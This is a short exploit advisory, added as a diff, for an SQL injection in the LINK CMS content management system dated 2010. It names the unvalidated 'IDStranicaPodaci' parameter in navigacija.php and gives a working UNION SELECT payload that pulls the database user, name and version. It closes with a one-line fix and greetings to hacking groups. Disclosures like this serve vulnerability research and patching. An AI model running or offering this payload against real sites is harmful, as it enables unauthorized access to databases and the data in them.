@@ -1,0 +1,38 @@
+# Exploit Title: LINK CMS.SQL Injection Vulnerability
+# Date: 2010-08-23
+# Author: hacker@sr.gov.yu
+# Software Link:
+http://www.link-softsolutions.com/SoftLink-Content-Management-System---CMS_20_1
+# Version: n/a
+
+
+####################################################################
+.:. Author : hacker@sr.gov.yu
+.:. Contact: hacker@evilzone.org, hacker@sr.gov.yu(MSN)
+.:. Home : www.evilzone.org, www.pentesting-rs.org
+.:. Script : LINK CMS
+.:. Bug Type : Sql Injection
+.:. Risk: High
+.:. Tested on : Windows & Linux
+ ####################################################################
+
+===[ Exploit ]===
+
+.:. It was found that LINK CMS does not validate properly the "IDStranicaPodaci"
+parameter value.
+
+http://server/navigacija.php?jezik=lat&IDMeniGlavni=6&IDMeniPodSekcija=45&IDMeniPodSekcija3=6&IDStranicaPodaci=63[SQLi]
+
+===[ Example ]===
+
+http://server/navigacija.php?jezik=lat&IDMeniGlavni=6&IDMeniPodSekcija=45&IDMeniPodSekcija3=6&IDStranicaPodaci=-63
+UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3,4--
+
+
+===[ Solution ]===
+
+.:. Input validation of "IDStranicaPodaci" parameter should be corrected.
+
+
+Greetz to ALL EVILZONE.org && pentesting-rs.org members!!!
+Pozdrav za sve iz Srbije!!! :-)))
